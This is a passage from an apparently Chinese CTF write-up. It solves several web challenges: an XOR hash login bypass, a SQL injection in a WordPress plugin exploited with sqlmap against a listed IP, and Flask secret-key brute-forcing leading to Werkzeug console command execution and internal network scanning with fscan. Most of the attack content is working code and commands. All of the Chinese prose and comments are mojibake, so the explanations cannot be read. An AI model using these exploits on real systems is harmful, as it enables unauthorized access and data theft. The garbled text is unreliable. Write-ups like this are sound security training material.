class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"password"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    self<span class="token punctuation">.</span>send_response<span class="token punctuation">(</span><span class="token number">403</span><span class="token punctuation">)</span>                    self<span class="token punctuation">.</span>end_headers<span class="token punctuation">(</span><span class="token punctuation">)</span>                    self<span class="token punctuation">.</span>wfile<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">b"YOU CANNOT LOGIN WITH SAME USERNAME AND PASSWORD!"</span><span class="token punctuation">)</span>                    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"same"</span><span class="token punctuation">)</span>                    <span class="token keyword">return</span>                hashed <span class="token operator">=</span> gethash<span class="token punctuation">(</span>params<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"username"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>params<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"password"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token keyword">for</span> k<span class="token punctuation">,</span>v <span class="token keyword">in</span> hashed_users<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    <span class="token keyword">if</span> hashed <span class="token operator">==</span> v<span class="token punctuation">:</span>                        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>                            <span class="token string">"user"</span><span class="token punctuation">:</span>k<span class="token punctuation">,</span>                            <span class="token string">"hash"</span><span class="token punctuation">:</span>hashed<span class="token punctuation">,</span>                            <span class="token string">"flag"</span><span class="token punctuation">:</span> FLAG <span class="token keyword">if</span> k <span class="token operator">==</span> <span class="token string">"admin"</span> <span class="token keyword">else</span> <span class="token string">"flag&#123;YOU_HAVE_TO_LOGIN_IN_AS_ADMIN_TO_GET_THE_FLAG&#125;"</span>                        <span class="token punctuation">&#125;</span>                        self<span class="token punctuation">.</span>send_response<span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span>                        self<span class="token punctuation">.</span>end_headers<span class="token punctuation">(</span><span class="token punctuation">)</span>                        self<span class="token punctuation">.</span>wfile<span class="token punctuation">.</span>write<span class="token punctuation">(</span>json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"success"</span><span class="token punctuation">)</span>                        <span class="token keyword">return</span>                self<span class="token punctuation">.</span>send_response<span class="token punctuation">(</span><span class="token number">403</span><span class="token punctuation">)</span>                self<span class="token punctuation">.</span>end_headers<span class="token punctuation">(</span><span class="token punctuation">)</span>                self<span class="token punctuation">.</span>wfile<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">b"Invalid username or password"</span><span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                self<span class="token punctuation">.</span>send_response<span class="token punctuation">(</span><span class="token number">404</span><span class="token punctuation">)</span>                self<span class="token punctuation">.</span>end_headers<span class="token punctuation">(</span><span class="token punctuation">)</span>                self<span class="token punctuation">.</span>wfile<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">b"404 Not Found"</span><span class="token punctuation">)</span>        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>            self<span class="token punctuation">.</span>send_response<span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span>            self<span class="token punctuation">.</span>end_headers<span class="token punctuation">(</span><span class="token punctuation">)</span>            self<span class="token punctuation">.</span>wfile<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">b"500 Internal Server Error"</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    server <span class="token operator">=</span> http<span class="token punctuation">.</span>server<span class="token punctuation">.</span>HTTPServer<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">,</span> <span class="token number">9999</span><span class="token punctuation">)</span><span class="token punctuation">,</span> MyHandler<span class="token punctuation">)</span>    server<span class="token punctuation">.</span>serve_forever<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><pre class="language-none"><code class="language-none">assert users[&quot;admin&quot;] &#x3D;&#x3D; &quot;admin&quot;usersä¸­å­˜åœ¨ç”¨æˆ·åâ€œadminâ€å¯†ç ä¹Ÿä¸ºâ€œadminâ€ï¼Œè¡¨é¢ä¸Šçœ‹éœ€è¦ä¼ å…¥çš„å‚æ•°ä¹Ÿä¸ºadmin&#x2F;adminã€‚</code></pre><p><a href="https://camo.githubusercontent.com/0a648064995f3f6282f0a6c04c149962353990ed8114498c12c0c2bef34b498f/68747470733a2f2f67697465652e636f6d2f776f646939386b2f636e626c6f6773696d616765732f7261772f6d61737465722f696d672f696d6167652d32303233303930373231303232323831372e706e67"><img src="https://camo.githubusercontent.com/0a648064995f3f6282f0a6c04c149962353990ed8114498c12c0c2bef34b498f/68747470733a2f2f67697465652e636f6d2f776f646939386b2f636e626c6f6773696d616765732f7261772f6d61737465722f696d672f696d6167652d32303233303930373231303232323831372e706e67" alt="image-20230907210222817" loading="lazy"></a></p><p>ç»§ç»­åˆ†ææºç å¯ä»¥å‘ç°eval()è¯­å¥å°†base64.b64encodeè¦†å†™ä¸ºbase64.b64decode</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">gethash</span><span class="token punctuation">(</span><span class="token operator">*</span>items<span class="token punctuation">)</span><span class="token punctuation">:</span>    c <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">for</span> item <span class="token keyword">in</span> items<span class="token punctuation">:</span>        <span class="token keyword">if</span> item <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>            <span class="token keyword">continue</span>        c <span class="token operator">^</span><span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">.</span>from_bytes<span class="token punctuation">(</span>hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>salt<span class="token punctuation">&#125;</span></span><span class="token string">[</span><span class="token interpolation"><span class="token punctuation">&#123;</span>item<span class="token punctuation">&#125;</span></span><span class="token string">]</span><span class="token interpolation"><span class="token punctuation">&#123;</span>salt<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>digest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"big"</span><span class="token punctuation">)</span> <span class="token comment"># it looks so complex! but is it safe enough?</span>    <span class="token keyword">return</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token comment">#å½“ä¼ å…¥çš„å‚æ•°itemsä¸º2ä¸ªæ—¶è¯¥å‡½æ•°ç­‰ä»·äºæ±‚ä¸¤ä¸ªå‚æ•°çš„å¼‚æˆ–å€¼å¹¶è¿”å›ï¼Œæ‰€ä»¥å½“ä¸¤ä¸ªå‚æ•°ç›¸ç­‰æ—¶ä¸ç®¡è¯¥å‚æ•°ä¸ºä½•å€¼ï¼Œè¿”å›å€¼éƒ½ä¸º0</span><span class="token comment">#è€Œä¼ å…¥å‚æ•°æœ‰ä¸¤ä¸ªè¿‡æ»¤ï¼Œusernameä¸èƒ½ç­‰äºâ€œadminâ€ï¼Œä¸”usernameä¸èƒ½ç­‰äºpasswordï¼Œè€Œæ‹¿åˆ°flagéœ€è¦hashedå€¼ä¸º0ï¼Œæ€ä¹ˆæ‰èƒ½åšåˆ°å‘¢ï¼Ÿ</span></code></pre><p><strong>è€Œä¼ å…¥å‚æ•°æœ‰ä¸¤ä¸ªè¿‡æ»¤ï¼Œusernameä¸èƒ½ç­‰äºâ€œadminâ€ï¼Œä¸”usernameä¸èƒ½ç­‰äºpasswordï¼Œè€Œæ‹¿åˆ°flagéœ€è¦hashedå€¼ä¸º0ï¼Œæ€ä¹ˆæ‰èƒ½åšåˆ°å‘¢ï¼Ÿ</strong></p><p>æ¥ä¸‹æ¥ç¼–å†™è„šæœ¬å³å¯æŠŠæ„é€ çš„jsonæ•°æ®base64ç¼–ç äº”æ¬¡</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> base64url <span class="token operator">=</span> <span class="token string">"http://localhost:5946/login"</span>username <span class="token operator">=</span> <span class="token string">"\"1\""</span>password <span class="token operator">=</span> <span class="token string">"1"</span>jsondata <span class="token operator">=</span> <span class="token string">"&#123;\"username\":"</span><span class="token operator">+</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>username<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token operator">+</span><span class="token string">",\"password\":"</span><span class="token operator">+</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>password<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token operator">+</span><span class="token string">"&#125;"</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>jsondata <span class="token operator">=</span> <span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span><span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    jsondata <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>jsondata<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>data <span class="token operator">=</span> <span class="token string">"&#123;\"params\":\""</span><span class="token operator">+</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>jsondata<span class="token punctuation">&#125;</span></span><span class="token string">\""</span></span><span class="token operator">+</span><span class="token string">"&#125;"</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>data <span class="token operator">=</span> <span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>req <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>req <span class="token operator">=</span> <span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span></code></pre><h4 id="å‡ºå»æ—…æ¸¸çš„å¿ƒæµ·"><a href="#å‡ºå»æ—…æ¸¸çš„å¿ƒæµ·" class="headerlink" title="å‡ºå»æ—…æ¸¸çš„å¿ƒæµ·"></a>å‡ºå»æ—…æ¸¸çš„å¿ƒæµ·</h4><p>æŸ¥çœ‹æºç é¡µé¢å¯å‘ç°ä¸€ä¸ªphpæ–‡ä»¶é“¾æ¥</p><p><img src="%E5%BF%83%E6%B5%B71.png" loading="lazy"></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*Plugin Name: Visitor auto recorderDescription: Automatically record visitor's identification, still in development, do not use in industry environment!Author: KoKoMi  Still in development! :)*/</span><span class="token comment">// ä¸è®¸å·çœ‹ï¼è¿™äº›ä»£ç æˆ‘è¿˜åœ¨è°ƒè¯•å‘¢ï¼</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// åŠ è½½æ•°æ®åº“é…ç½®ï¼Œæš‚æ—¶ç”¨ç¡¬ç¼–ç ç»å¯¹è·¯å¾„</span><span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/var/www/html/wordpress/'</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'wp-config.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$db_user</span> <span class="token operator">=</span> <span class="token constant">DB_USER</span><span class="token punctuation">;</span> <span class="token comment">// æ•°æ®åº“ç”¨æˆ·å</span><span class="token variable">$db_password</span> <span class="token operator">=</span> <span class="token constant">DB_PASSWORD</span><span class="token punctuation">;</span> <span class="token comment">// æ•°æ®åº“å¯†ç </span><span class="token variable">$db_name</span> <span class="token operator">=</span> <span class="token constant">DB_NAME</span><span class="token punctuation">;</span> <span class="token comment">// æ•°æ®åº“åç§°</span><span class="token variable">$db_host</span> <span class="token operator">=</span> <span class="token constant">DB_HOST</span><span class="token punctuation">;</span> <span class="token comment">// æ•°æ®åº“ä¸»æœº</span><span class="token comment">// æˆ‘è®°å¾—å¯ä»¥ç”¨wpæä¾›çš„global $wpdbæ¥æ“ä½œæ•°æ®åº“ï¼Œç­‰æ—…æ¸¸å›æ¥å†ç ”ç©¶ä¸€ä¸‹</span><span class="token comment">// è¿™äº›æ˜¯ä¸´æ—¶çš„ä»£ç </span><span class="token variable">$ip</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ip'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$user_agent</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user_agent'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$time</span> <span class="token operator">=</span> <span class="token function">stripslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'time'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$mysqli</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">mysqli</span><span class="token punctuation">(</span><span class="token variable">$db_host</span><span class="token punctuation">,</span> <span class="token variable">$db_user</span><span class="token punctuation">,</span> <span class="token variable">$db_password</span><span class="token punctuation">,</span> <span class="token variable">$db_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// æ£€æŸ¥è¿æ¥æ˜¯å¦æˆåŠŸ</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$mysqli</span><span class="token operator">-></span><span class="token property">connect_errno</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'æ•°æ®åº“è¿æ¥å¤±è´¥: '</span> <span class="token operator">.</span> <span class="token variable">$mysqli</span><span class="token operator">-></span><span class="token property">connect_error</span><span class="token punctuation">;</span>    <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$query</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"INSERT INTO visitor_records (ip, user_agent, time) VALUES ('<span class="token interpolation"><span class="token variable">$ip</span></span>', '<span class="token interpolation"><span class="token variable">$user_agent</span></span>', <span class="token interpolation"><span class="token variable">$time</span></span>)"</span><span class="token punctuation">;</span><span class="token comment">// æ‰§è¡Œæ’å…¥</span><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$mysqli</span><span class="token punctuation">,</span> <span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// æ£€æŸ¥æ’å…¥æ˜¯å¦æˆåŠŸ</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'æ•°æ®æ’å…¥æˆåŠŸ'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'æ•°æ®æ’å…¥å¤±è´¥: '</span> <span class="token operator">.</span> <span class="token function">mysqli_error</span><span class="token punctuation">(</span><span class="token variable">$mysqli</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// å…³é—­æ•°æ®åº“è¿æ¥</span><span class="token function">mysqli_close</span><span class="token punctuation">(</span><span class="token variable">$mysqli</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//gptçœŸå¥½ç”¨</span></span></code></pre><p><img src="%E5%BF%83%E6%B5%B72.png" loading="lazy"></p><p>æ ¹æ®æµ‹è¯•å‘ç°timeå­˜åœ¨æŠ¥é”™æ³¨å…¥</p><p><img src="%E5%BF%83%E6%B5%B73.png" loading="lazy"></p><p>sqlmapä¸€æŠŠæ¢­</p><pre class="language-sql" data-language="sql"><code class="language-sql">python3 sqlmap<span class="token punctuation">.</span>py  <span class="token operator">-</span>u <span class="token string">"http://101.42.178.83:7770/wordpress/wp-content/plugins/visitor-logging/logger.php"</span>  <span class="token comment">--data "time=1"  --dbs  --batch</span>python3 sqlmap<span class="token punctuation">.</span>py  <span class="token operator">-</span>u <span class="token string">"http://101.42.178.83:7770/wordpress/wp-content/plugins/visitor-logging/logger.php"</span>  <span class="token comment">--data "time=1"  -D wordpress --tables --batch</span>python3 sqlmap<span class="token punctuation">.</span>py  <span class="token operator">-</span>u <span class="token string">"http://101.42.178.83:7770/wordpress/wp-content/plugins/visitor-logging/logger.php"</span>  <span class="token comment">--data "time=1"  -D wordpress  -T secret_of_kokomi --columns --batch</span></code></pre><h4 id="moeworld"><a href="#moeworld" class="headerlink" title="moeworld"></a>moeworld</h4><p>é¦–å…ˆçˆ†ç ´secret key</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> itertools<span class="token keyword">import</span> zlib<span class="token keyword">from</span> flask<span class="token punctuation">.</span>sessions <span class="token keyword">import</span> SecureCookieSessionInterface<span class="token keyword">from</span> itsdangerous <span class="token keyword">import</span> base64_decode<span class="token comment">#https://github.com/noraj/flask-session-cookie-manager</span><span class="token keyword">class</span> <span class="token class-name">MockApp</span><span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> secret_key<span class="token punctuation">)</span><span class="token punctuation">:</span>self<span class="token punctuation">.</span>secret_key <span class="token operator">=</span> secret_key<span class="token keyword">def</span> <span class="token function">encode</span><span class="token punctuation">(</span>secret_key<span class="token punctuation">,</span> session_cookie_structure<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">try</span><span class="token punctuation">:</span>app <span class="token operator">=</span> MockApp<span class="token punctuation">(</span>secret_key<span class="token punctuation">)</span>session_cookie_structure <span class="token operator">=</span> session_cookie_structuresi <span class="token operator">=</span> SecureCookieSessionInterface<span class="token punctuation">(</span><span class="token punctuation">)</span>s <span class="token operator">=</span> si<span class="token punctuation">.</span>get_signing_serializer<span class="token punctuation">(</span>app<span class="token punctuation">)</span><span class="token keyword">return</span> s<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>session_cookie_structure<span class="token punctuation">)</span><span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span><span class="token keyword">return</span> <span class="token string">"[Encoding error] &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">decode</span><span class="token punctuation">(</span>session_cookie_value<span class="token punctuation">,</span> secret_key<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">if</span> <span class="token punctuation">(</span>secret_key <span class="token operator">==</span> <span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>compressed <span class="token operator">=</span> <span class="token boolean">False</span>payload <span class="token operator">=</span> session_cookie_value<span class="token keyword">if</span> payload<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>compressed <span class="token operator">=</span> <span class="token boolean">True</span>payload <span class="token operator">=</span> payload<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span>data <span class="token operator">=</span> payload<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>data <span class="token operator">=</span> base64_decode<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token keyword">if</span> compressed<span class="token punctuation">:</span>data <span class="token operator">=</span> zlib<span class="token punctuation">.</span>decompress<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token keyword">return</span> data<span class="token keyword">else</span><span class="token punctuation">:</span>app <span class="token operator">=</span> MockApp<span class="token punctuation">(</span>secret_key<span class="token punctuation">)</span>si <span class="token operator">=</span> SecureCookieSessionInterface<span class="token punctuation">(</span><span class="token punctuation">)</span>s <span class="token operator">=</span> si<span class="token punctuation">.</span>get_signing_serializer<span class="token punctuation">(</span>app<span class="token punctuation">)</span><span class="token keyword">return</span> s<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>session_cookie_value<span class="token punctuation">)</span>cookie <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">for</span> c <span class="token keyword">in</span> itertools<span class="token punctuation">.</span>product<span class="token punctuation">(</span><span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">,</span> repeat<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>k <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">try</span><span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span>decode<span class="token punctuation">(</span>cookie<span class="token punctuation">,</span> <span class="token string">"This-random-secretKey-you-can't-get"</span><span class="token operator">+</span>k<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span><span class="token keyword">pass</span><span class="token keyword">else</span><span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token keyword">break</span></code></pre><p>secret keyæ˜¯<code>This-random-secretKey-you-can&#39;t-get06f0</code>,æœ‰äº†secret keyå°±èƒ½è‡ªå·±ä¿®æ”¹sessionä¸ºadminã€‚adminçš„privateç•™è¨€è¯´pinç 904-474-531ï¼Œæ‰€ä»¥å»åˆ°<a href="http://47.115.201.35:8000/console">http://47.115.201.35:8000/console</a> ï¼Œè¾“å…¥pinç åˆ™è·å¾—console</p><p>æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼š</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> subprocesssubprocess<span class="token punctuation">.</span>check_output<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'ls'</span><span class="token punctuation">,</span><span class="token string">'/'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>subprocess<span class="token punctuation">.</span>check_output<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'cat'</span><span class="token punctuation">,</span><span class="token string">'/flag'</span><span class="token punctuation">]</span><span class="token punctuation">)</span></code></pre><p>è·å¾—ç¬¬ä¸€éƒ¨åˆ†flagï¼š<code>moectf&#123;Information-leakage-Is-dangerous!</code></p><p>è¿˜æœ‰ä¸ªreadmeï¼Œpython decodeåçœ‹åˆ°æç¤º</p><pre class="language-none"><code class="language-none">æ­å–œä½ é€šè¿‡å¤–ç½‘æ¸—é€æ‹¿ä¸‹äº†æœ¬å°æœåŠ¡å™¨çš„æƒé™æ¥ä¸‹æ¥ï¼Œä½ éœ€è¦å°è¯•å†…ç½‘æ¸—é€ï¼Œæœ¬æœåŠ¡å™¨çš„&#x2F;app&#x2F;toolsç›®å½•ä¸‹å†…ç½®äº†fscanä½ éœ€è¦äº†è§£å®ƒçš„åŸºæœ¬ç”¨æ³•ï¼Œç„¶åæ‰«æå†…ç½‘çš„ipæ®µå¦‚æœä½ è¿›è¡Œäº†æ­£ç¡®çš„æ“ä½œï¼Œä¼šå¾—åˆ°ç±»ä¼¼ä¸‹é¢çš„ç»“æœ10.1.11.11:22 open10.1.23.21:8080 open10.1.23.23:9000 openå°†ä½ å¾—åˆ°çš„è‹¥å¹²ä¸ªç«¯å£å·ä»å°åˆ°å¤§æ’åºå¹¶ä»¥ - åˆ†å‰²ï¼Œè¿™ä¸€ä¸²å³ä¸ºhint.zipå‹ç¼©åŒ…çš„å¯†ç ï¼ˆæœ¬ä¾‹ä¸­ï¼Œå¯†ç ä¸ºï¼š22-8080-9000ï¼‰æ³¨æ„ï¼šè¯·å¿½ç•¥æ‰xx.xx.xx.1ï¼Œä¾‹å¦‚æ‰«å‡ºä¸‰ä¸ªip 192.168.0.1 192.168.0.2 192.168.0.3 ï¼Œè¯·å¿½ç•¥æ‰æœ‰å…³192.168.0.1çš„æ‰€æœ‰ç»“æœï¼æ­¤ä¸ºå‡ºé¢˜äººæœåŠ¡å™¨ä¸Šçš„å…¶å®ƒæ­£å¸¸æœåŠ¡å¯¹å¯†ç æœ‰ç–‘é—®éšæ—¶å’¨è¯¢å‡ºé¢˜äºº</code></pre><p>æç¤ºç”¨fscanï¼Œçœ‹ä¸€ä¸‹help</p><pre class="language-python" data-language="python"><code class="language-python">subprocess<span class="token punctuation">.</span>check_output<span class="token punctuation">(</span><span class="token string">"/app/tools/fscan --help"</span><span class="token punctuation">,</span>stderr<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>STDOUT<span class="token punctuation">,</span>shell<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span></code></pre><p>æ˜¯è¿™ä¸ªå·¥å…·ï¼š <a href="https://github.com/shadow1ng/fscan">https://github.com/shadow1ng/fscan</a></p><p>çœ‹ä¸€ä¸‹æœ¬æœºå†…ç½‘ip, å‚è€ƒ <a href="https://blog.csdn.net/kuanggudejimo/article/details/99454185">https://blog.csdn.net/kuanggudejimo/article/details/99454185</a></p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> socket<span class="token punctuation">;</span>s <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_DGRAM<span class="token punctuation">)</span><span class="token punctuation">;</span>s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'8.8.8.8'</span><span class="token punctuation">,</span> <span class="token number">80</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>ip <span class="token operator">=</span> s<span class="token punctuation">.</span>getsockname<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">print</span><span class="token punctuation">(</span>ip<span class="token punctuation">)</span></code></pre><p>å¾—åˆ°ipä¸º<code>172.21.0.2</code>ã€‚æ‰«æï¼š</p><pre class="language-python" data-language="python"><code class="language-python">subprocess<span class="token punctuation">.</span>check_output<span class="token punctuation">(</span><span class="token string">"/app/tools/fscan -h 127.21.0.2/24"</span><span class="token punctuation">,</span>stderr<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>STDOUT<span class="token punctuation">,</span>shell<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span></code></pre><p>å¾—åˆ°hint.zipå¯†ç ï¼š 22-3306-6379-8080</p><p>ç„¶åä¸è¦å¡åœ¨æ€ä¹ˆé…ç½®frpè¿›è¡Œå†…ç½‘ç©¿é€ï¼Œé‚£ä¸ªè¦è‡ªå·±å¼€vpsï¼Œæˆ–è€…è¦æœ‰ä¸ªè‡ªå·±çš„å…¬ç½‘ipã€‚ç©¿é€åªæ˜¯è¾…åŠ©æ•ˆæœï¼Œå¸®åŠ©æˆ‘ä»¬æ¸—é€æ›´åŠ æ–¹ä¾¿ï¼Œä¸é…ç½®ç›´æ¥ç”¨python consoleä¹Ÿæ˜¯å¯ä»¥çš„ã€‚ä¹Ÿä¸è¦æƒ³ç”¨ngrokå…è´¹ç‰ˆï¼Œå…è´¹ç‰ˆåªèƒ½è½¬å‘ä¸€ä¸ªç«¯å£ï¼Œè€Œç©¿é€è‡³å°‘è¦ä¸¤ä¸ªç«¯å£ã€‚ç›´æ¥å»æmysqlï¼š</p><pre class="language-python" data-language="python"><code class="language-python">subprocess<span class="token punctuation">.</span>check_output<span class="token punctuation">(</span><span class="token string">"cat dataSql.py"</span><span class="token punctuation">,</span>stderr<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>STDOUT<span class="token punctuation">,</span>shell<span 